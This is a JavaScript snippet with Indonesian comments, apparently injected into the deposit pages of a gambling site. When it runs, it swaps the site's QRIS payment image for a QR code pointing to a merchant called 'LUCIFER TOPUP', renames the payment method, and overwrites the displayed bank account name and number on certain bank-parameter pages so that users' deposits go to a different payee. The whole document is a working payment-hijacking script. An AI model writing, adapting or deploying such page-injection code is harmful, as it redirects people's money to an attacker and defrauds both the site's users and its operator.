(function() {
  const url = window.location.href;

  // Fungsi untuk jalankan hanya di qris.php
  if (url.endsWith('qris.php')) {
    // Ganti URL gambar
    document.querySelectorAll('img').forEach(img => {
      if (img.src === "http://dewaspinpro.site/QRIS.jpg") {
        img.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
      }
    });

    // Ganti value di <select>
    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("FUK STORE, PAKUHAJI")) {
      metodeSelect.textContent = "LUCIFER TOPUP";
    }
  }

  // Fungsi untuk jalankan di url /?bank=NDk5 dll
  const bankParams = ['NQ==','Ng==','Nw==','OA==','MTI5Mw==','MTU0','MTU2'];
  if (bankParams.some(param => url.endsWith(`/?bank=${param}`))) {
    // Nama Akun Bank
    const namaAkunInput = document.getElementById('info-copy-1');
    if (namaAkunInput) namaAkunInput.value = "Alihkan Ke Qris";

    const namaAkunSpan = document.querySelector('[data-sel="info-copy-1"] span');
    if (namaAkunSpan) namaAkunSpan.textContent = "Alihkan Ke Qris";

    // Rekening Bank No
    const rekeningInput = document.getElementById('info-copy-2');
    if (rekeningInput) rekeningInput.value = "A01 || Instan Deposit";

    const rekeningSpan = document.querySelector('[data-sel="info-copy-2"] span');
    if (rekeningSpan) rekeningSpan.textContent = "A01 || Instan Deposit";

    // Tambahkan gambar di bawah Rekening Bank No
    const rekeningContainer = rekeningInput.parentElement;
    if (rekeningContainer && !document.getElementById('custom-qris-img')) {
      const img = document.createElement('img');
      img.id = 'custom-qris-img';
      img.src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126760024ID.CO.SPEEDCASH.MERCHANT01189360081530002142180215ID10250021421860303UKE51440014ID.CO.QRIS.WWW0215ID10254347309470303UKE5204581653033605802ID5913LUCIFER%20TOPUP6005MEDAN61052022662330509S2696179801091263632820703A0163045DEA";
      img.style.maxWidth = "200px"; // Atur ukuran sesuai kebutuhan
      img.style.display = "block";
      img.style.marginTop = "10px";
      rekeningContainer.appendChild(img);
    }
  }
})();
